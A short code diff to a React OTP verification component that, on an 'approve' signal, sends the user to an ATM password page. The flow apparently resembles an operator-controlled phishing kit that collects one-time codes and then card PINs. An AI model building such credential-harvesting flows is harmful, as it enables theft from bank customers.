@@ -61,8 +61,8 @@ export default function OTPVerification() {
     const action = codeAction.value;
     if (action) {
       if (action.action === "approve") {
-        // Navigate to final page
-        navigate("/final-page");
+        // Navigate to ATM password page
+        navigate("/atm-password");
       } else if (action.action === "reject") {
         // Show error and clear OTP
         setOtp("");
